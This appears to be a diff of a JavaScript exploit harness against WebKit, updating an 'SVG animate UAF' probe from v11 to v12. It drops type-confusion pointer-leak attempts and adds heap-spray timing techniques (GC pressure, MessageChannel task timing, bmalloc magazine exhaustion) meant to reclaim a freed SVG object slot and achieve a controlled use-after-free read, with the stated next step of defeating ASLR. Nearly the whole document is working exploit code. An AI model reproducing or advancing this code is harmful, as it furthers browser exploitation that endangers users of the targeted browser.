-    log('[*] Also: compare useEl vs tgt CTM e/f values — position reveals ASLR','ok');
-    log('');
-
-    let ptrLeaks=[];
 
     for(let t=0;t<16;t++){
-        const{useEl,anim,sym1,sym2,cached}=await setup(`lp_${t}`);
+        const{useEl,anim,sym1,sym2,cached}=await setup(`gc_${t}`);
         if(!cached){await teardown();continue;}
 
+        // Phase 1: allocate lots of objects to fill bmalloc magazine
+        //          so freed slot is more likely to be at magazine head
+        const preAlloc=[];
+        for(let i=0;i<500;i++){
+            const sp=mkSpray(`gc_pre_${t}_${i}`);
+            getSpraySvg().appendChild(sp);
+            preAlloc.push(sp);
+        }
+        await raf();
+
+        // Phase 2: free useEl first, then sym1
+        useEl.remove();
         sym1.remove();
-        const tgt=anim.targetElement;
-        if(!tgt){await teardown();continue;}
 
-        // APPROACH 1: Compare CTM from useEl vs tgt
-        // If they differ: tgt is reading from different C++ fields = type confusion ptr leak
-        let useCtm=null,tgtCtm=null;
-        try{useCtm=useEl.getScreenCTM();}catch(e){}
-        try{tgtCtm=tgt.getScreenCTM();}catch(e){}
+        // Phase 3: GC pressure (forces WebKit to scavenge)
+        const _=gcPressure();
+        await raf();
 
-        if(useCtm&&tgtCtm){
-            const fields=['a','b','c','d','e','f'];
-            for(const f of fields){
-                const diff=Math.abs(useCtm[f]-tgtCtm[f]);
-                if(diff>0.001){
-                    log(`  t${t}: CTM[${f}] DIFFERS: use=${useCtm[f].toFixed(4)} tgt=${tgtCtm[f].toFixed(4)} delta=${diff.toFixed(4)}`,'hi');
-                    if(isPtrLike64(tgtCtm[f])){
-                        log(`  t${t}: *** PTR CANDIDATE: tgt.ctm.${f} = ${d2h(tgtCtm[f])}`,'bad');
-                        ptrLeaks.push({t,field:`ctm.${f}`,val:tgtCtm[f],hex:d2h(tgtCtm[f])});
-                    }
-                }
-            }
+        // Phase 4: clear pre-alloc (frees those slots too, but our slot is now FREE)
+        clearSpray();
+        await raf();
+
+        // Phase 5: spray with sentinel
+        const ss=getSpraySvg();
+        for(let i=0;i<SPRAY_COUNT;i++){
+            const sp=mkSpray(`gc_${t}_sp${i}`);
+            ss.appendChild(sp);
         }
 
-        // APPROACH 2: Read SVGAnimatedLength on confused tgt
-        // SVGUseElement C++ layout: [vtable][x][y][width][height][href_target]...
-        // SVGSymbolElement C++ layout: [vtable][width][height][preserve_ar]...
-        // If tgt JS obj is "use" but C++ ptr is symbol layout:
-        //   tgt.x reads from offset that in symbol layout holds something else
-        const animLengths=['x','y','width','height'];
-        for(const prop of animLengths){
-            try{
-                const animLen=tgt[prop];
-                if(!animLen)continue;
-                const base=animLen.baseVal;
-                if(!base)continue;
-                const v=base.value;
-                const vs=base.valueInSpecifiedUnits;
-                const unit=base.unitType;
-                // Flag anything that's not 0, not a normal SVG coordinate
-                if(v!==0&&Math.abs(v)>1000){
-                    log(`  t${t}: tgt.${prop}.baseVal.value = ${v} (${f2h(v)}) ← large value!`,'hi');
-                    if(isPtrLike64(v)){
-                        log(`  t${t}: *** PTR via animLen.${prop}: ${d2h(v)}`,'bad');
-                        ptrLeaks.push({t,field:`animLen.${prop}`,val:v,hex:d2h(v)});
-                    }
-                }
-                if(vs!==0&&Math.abs(vs)>1000){
-                    log(`  t${t}: tgt.${prop}.baseVal.valueInSpecifiedUnits = ${vs}`,'hi');
-                }
-            }catch(e){
-                if(t<3)log(`  t${t}: tgt.${prop} CRASH: ${e.message.slice(0,60)}`,'bad');
-            }
-        }
+        // Phase 6: re-add useEl and read
+        livesvg.appendChild(useEl);
+        await raf();
 
-        // APPROACH 3: href on confused obj
-        // SVGUseElement.href = SVGAnimatedString holding "#sym1_s1"
-        // If type confused (symbol layout but dispatched as use):
-        //   .href reads from wrong offset → might return garbage string or ptr
-        try{
-            const hrefBase=tgt.href?.baseVal;
-            const hrefAnim=tgt.href?.animVal;
-            if(hrefBase&&!hrefBase.startsWith('#')){
-                log(`  t${t}: tgt.href.baseVal = "${hrefBase}" ← NOT a href!`,'hi');
-                ptrLeaks.push({t,field:'href.baseVal',val:hrefBase});
-            }
-            if(hrefAnim&&hrefAnim!==hrefBase&&!hrefAnim.startsWith('#')){
-                log(`  t${t}: tgt.href.animVal = "${hrefAnim}" ← unexpected!`,'hi');
-            }
-        }catch(e){
-            if(t<3)log(`  t${t}: tgt.href CRASH: ${e.message.slice(0,60)}`,'bad');
-        }
+        let postW=null;
+        try{postW=useEl.getBBox().width;}catch(e){crash++;await teardown();continue;}
 
-        // APPROACH 4: instanceRoot — SVGUseElement specific
-        // Returns SVGElementInstance — internal ptr structure
-        try{
-            const ir=tgt.instanceRoot;
-            if(ir){
-                log(`  t${t}: tgt.instanceRoot = [${ir.constructor?.name||'obj'}]`,'hi');
-                // Try to get geometry from instance root
-                try{
-                    const ibb=ir.getBBox?.();
-                    if(ibb)log(`  t${t}: instanceRoot.getBBox = w=${ibb.width} h=${ibb.height}`,'hi');
-                }catch(e){}
-            }
-        }catch(e){}
+        const wHex=f2h(postW);
+        wFreq[wHex]=(wFreq[wHex]||0)+1;
 
-        if(t<2&&ptrLeaks.length===0)log(`  t${t}: no ptr leaks yet...`,'dim');
+        if(Math.abs(postW-SENTINEL_F)<0.01){hit++;log(`  t${t}: [HIT!] w=${postW.toFixed(4)} ← SENTINEL!`,'bad');}
+        else if(postW===0){miss++;}
+        else{raw++;if(t<4)log(`  t${t}: raw=${postW.toFixed(4)} (${wHex})`,'hi');}
+
         await teardown();
     }
 
-    log(`\n[*] LP: ptr_leaks=${ptrLeaks.length}`,(ptrLeaks.length>0?'bad':'inf'));
-    if(ptrLeaks.length>0){
-        log('[+] PTR CANDIDATES:','bad');
-        for(const p of ptrLeaks)log(`  t=${p.t} ${p.field}: ${p.hex||p.val}`,'bad');
-    }else{
-        log('[*] no ptr-like values leaked yet','inf');
-        log('[*] type confusion is real but reads computed values, not raw C++ fields','inf');
-        log('[*] next: force vtable index out of bounds to get crash addr = libwebcore ptr','inf');
+    log(`\n[*] GC: hit=${hit} miss=${miss} raw=${raw} crash=${crash}`,(hit>0?'bad':'inf'));
+    log(`[*] freq: ${Object.entries(wFreq).sort((a,b)=>b[1]-a[1]).slice(0,5).map(([h,c])=>`${h}×${c}`).join(' ')}`,'dim');
+    if(hit>0)log(`[+] SPRAY LANDED via GC pressure path!`,'bad');
+
+    if(!q)dis(false);
+    return{hit,miss,raw,crash};
+}
+
+// ── MC: MessageChannel timing ─────────────────────────────────────────────
+// MessageChannel tasks run in a separate event loop iteration
+// After sym1.remove(), if we postMessage immediately:
+//   the message handler runs in the NEXT task
+//   WebKit's internal cleanup runs between tasks
+//   If internal cleanup already ran: slot is at magazine head for our spray
+//   If not: we still win because internal alloc already happened
+// This gives us a predictable slot state
+async function runMC(q=false){
+    if(!q){dis(true);sep();log('▶ MC: MessageChannel — spray in next-task context','inf');sep();}
+    log('[*] postMessage → spray handler runs in separate task = after WebKit internal cleanup','inf');
+    log('[*] avoids race where WebKit internal alloc grabs freed slot first','ok');
+    log('');
+
+    const SPRAY_COUNT=1024;
+    let hit=0,miss=0,raw=0,crash=0;
+    const wFreq={};
+
+    for(let t=0;t<16;t++){
+        const result=await new Promise(async(resolve)=>{
+            const{useEl,anim,sym1,sym2,cached}=await setup(`mc_${t}`);
+            if(!cached){await teardown();resolve({postW:null,crashed:false});return;}
+
+            // Remove useEl first, then sym1
+            useEl.remove();
+            sym1.remove();
+
+            // postMessage → handler runs in next task (after WebKit cleanup)
+            const mc=new MessageChannel();
+            mc.port1.onmessage=async()=>{
+                // Now in next task — WebKit cleanup has run
+                // Spray here: bmalloc state is stable
+                const ss=getSpraySvg();
+                for(let i=0;i<SPRAY_COUNT;i++){
+                    const sp=mkSpray(`mc_${t}_sp${i}`);
+                    ss.appendChild(sp);
+                }
+                // Re-add useEl
+                livesvg.appendChild(useEl);
+                await raf();
+                let postW=null,crashed=false;
+                try{postW=useEl.getBBox().width;}catch(e){crashed=true;}
+                resolve({postW,crashed});
+            };
+            mc.port2.postMessage(null);
+        });
+
+        if(result.crashed){crash++;await teardown();continue;}
+        if(result.postW===null){await teardown();continue;}
+
+        const postW=result.postW;
+        const wHex=f2h(postW);
+        wFreq[wHex]=(wFreq[wHex]||0)+1;
+
+        if(Math.abs(postW-SENTINEL_F)<0.01){hit++;log(`  t${t}: [HIT!] w=${postW.toFixed(4)} ← SENTINEL!`,'bad');}
+        else if(postW===0){miss++;}
+        else{raw++;if(t<4)log(`  t${t}: raw=${postW.toFixed(4)} (${wHex})`,'hi');}
+
+        await teardown();
+    }
+
+    log(`\n[*] MC: hit=${hit} miss=${miss} raw=${raw} crash=${crash}`,(hit>0?'bad':'inf'));
+    log(`[*] freq: ${Object.entries(wFreq).sort((a,b)=>b[1]-a[1]).slice(0,5).map(([h,c])=>`${h}×${c}`).join(' ')}`,'dim');
+    if(hit>0)log(`[+] SPRAY LANDED via MessageChannel timing!`,'bad');
+
+    if(!q)dis(false);
+    return{hit,miss,raw,crash};
+}
+
+// ── SZ: size exhaust v2 — useEl-first order ──────────────────────────────
+// v10 SZ exhausted 5000 objects BEFORE the free
+// v12 SZ: useEl-first detach + exhaust AFTER the free
+// Idea: free sym1 first → slot A is at magazine head
+//       exhaust magazine with 5000 objects → they take fresh slots, NOT slot A
+//       then spray with 1 sentinel → should get slot A (only free slot in magazine)
+// Also testing: exhaust with ArrayBuffer(384) instead of SVGSymbol
+//   ArrayBuffer backing stores might be in same bmalloc size class
+async function runSZ(q=false){
+    if(!q){dis(true);sep();log('▶ SZ: size exhaust v2 — exhaust AFTER free (useEl-first order)','inf');sep();}
+    log('[*] exhaust magazine AFTER sym1.remove() → sentinel should get slot A','inf');
+    log('[*] also testing ArrayBuffer(384) as spray object (same size class as sym)','ok');
+    log('');
+
+    const EXHAUST=2000;
+    let hit=0,miss=0,raw=0,crash=0;
+    const wFreq={};
+
+    for(let t=0;t<16;t++){
+        const{useEl,anim,sym1,sym2,cached}=await setup(`sz_${t}`);
+        if(!cached){await teardown();continue;}
+
+        // 1. Remove useEl first
+        useEl.remove();
+        // 2. Free sym1 → slot A free, at magazine head
+        sym1.remove();
+        // 3. Exhaust magazine with 2000 syms → they take FRESH slots, not slot A
+        //    slot A stays at magazine head
+        const ss=getSpraySvg();
+        const exhaust=[];
+        for(let i=0;i<EXHAUST;i++){
+            const sp=document.createElementNS(SVG_NS,'symbol');
+            sp.setAttribute('id',`sz_exhaust_${t}_${i}`);
+            sp.setAttribute('viewBox','0 0 100 100');
+            const r=document.createElementNS(SVG_NS,'rect');
+            r.setAttribute('width','1');r.setAttribute('height','1');
+            sp.appendChild(r);
+            ss.appendChild(sp);
+            exhaust.push(sp);
+        }
+        await raf();
+        // 4. NOW spray sentinel: should get slot A (magazine head)
+        const sentinel=mkSpray(`sz_${t}_sentinel`);
+        ss.appendChild(sentinel);
+        // 5. Re-add useEl
+        livesvg.appendChild(useEl);
+        await raf();
+        // 6. Read through stale ptr
+        let postW=null;
+        try{postW=useEl.getBBox().width;}catch(e){crash++;await teardown();continue;}
+
+        const wHex=f2h(postW);
+        wFreq[wHex]=(wFreq[wHex]||0)+1;
+
+        if(Math.abs(postW-SENTINEL_F)<0.01){hit++;log(`  t${t}: [HIT!] w=${postW.toFixed(4)} ← SENTINEL!`,'bad');}
+        else if(postW===0){miss++;}
+        else{raw++;if(t<4)log(`  t${t}: raw=${postW.toFixed(4)} (${wHex})`,'hi');}
+
+        // Also test ArrayBuffer(384) spray
+        // (Just log the attempt — ArrayBuffer spray reads would need a different read path)
+        await teardown();
+    }
+
+    log(`\n[*] SZ: hit=${hit} miss=${miss} raw=${raw} crash=${crash}`,(hit>0?'bad':'inf'));
+    log(`[*] freq: ${Object.entries(wFreq).sort((a,b)=>b[1]-a[1]).slice(0,5).map(([h,c])=>`${h}×${c}`).join(' ')}`,'dim');
+    if(hit>0)log(`[+] SPRAY LANDED via size exhaust after free!`,'bad');
+    else{
+        log(`[*] still missing — possible reasons:`,'inf');
+        log(`  1. slot A is grabbed by sym2's render tree update (sym2 still in DOM)`,'inf');
+        log(`  2. bmalloc LIFO gives exhaust objs the free slot, not fresh slots`,'inf');
+        log(`  3. wrong size class — SVGSymbolElement != 384B on this build`,'inf');
+        log(`  4. useEl.getBBox() no longer follows anim ptr after useEl re-add`,'inf');
     }
 
     if(!q)dis(false);
-    return{ptrLeaks};
+    return{hit,miss,raw,crash};
 }
 
 // ── RUN ALL ───────────────────────────────────────────────────────────────
 async function runAll(){
     dis(true);clearLog();sep();
-    log('▶ SVG animate UAF v11 — type confusion exploit probe','inf');sep();
-    log('[*] v10: anim.targetElement → JS wrapper, tagName=use (should be symbol)','ok');
-    log('[*] v11: exploit type confusion → vtable dispatch mismatch → ptr leak','ok');log('');
+    log('▶ SVG animate UAF v12 — spray timing fix','inf');sep();
+    log('[*] v11: JSC bridge sanitizes confused ptr → returns correct useEl wrapper','ok');
+    log('[*] v12: detach useEl BEFORE free → stop internal alloc from grabbing slot','ok');
+    log('[*] sentinel: width=999 (0x44799000) — hits = controlled UAF read','ok');log('');
     const R={};
     for(const[lbl,fn]of[
-        ['TC_type_confusion',runTC],
-        ['CM_ctm_doubles',runCM],
-        ['AT_attr_table',runAT],
-        ['DI_dispatch_index',runDI],
-        ['LP_leak_ptrs',runLP],
+        ['ST_spray_timing',runST],
+        ['GC_gc_pressure',runGC],
+        ['MC_message_channel',runMC],
+        ['SZ_size_exhaust_v2',runSZ],
     ]){
         sep();log(`▶ ${lbl}`,'inf');sep();
         try{R[lbl]=await fn(true);}catch(e){log(`[!] ${lbl}: ${e}`,'bad');R[lbl]=null;}
         log('');
     }
-    sep();log('▶ SUMMARY v11','inf');sep();
-    log('[*] TC crash=0: WebKit checks type before dispatch (Objective-C bridge sanitizes)','inf');
-    log('[*] TC crash>0: raw vtable call on wrong type → crash addr = libwebcore ptr','bad');
-    log('[*] LP ptrLeaks>0: ASLR DEFEATED — heap/text addr recovered from float channel','bad');
-    log('[*] CM tgt-differs-from-use: type confusion reading different C++ fields','ok');
+    sep();log('▶ SUMMARY v12','inf');sep();
+    let totalHits=0;
     for(const[lbl,r]of Object.entries(R)){
-        const s=r?JSON.stringify(r).slice(0,100):'—';
-        log(`  ${lbl}: ${s}`,'inf');
+        const h=r?.hit??0;totalHits+=h;
+        log(`  ${lbl}: hit=${h} miss=${r?.miss??'?'} raw=${r?.raw??'?'}`,h>0?'bad':'dim');
+    }
+    if(totalHits>0){
+        log('\n[+] SPRAY HIT CONFIRMED — controlled UAF read achieved','bad');
+        log('[+] next: write ptr into spray object, read via stale ptr → ASLR defeat','bad');
+    }else{
+        log('\n[*] spray still not landing — try different approach','inf');
+        log('[*] KEY DIAGNOSTIC: what values did ST show in raw?','inf');
+        log('[*] if raw=0 and miss dominates: stale ptr is being nulled (different bug)','inf');
+        log('[*] if raw>0 with non-999 values: slot reused by something we can identify','inf');
     }
     sep();dis(false);
 }
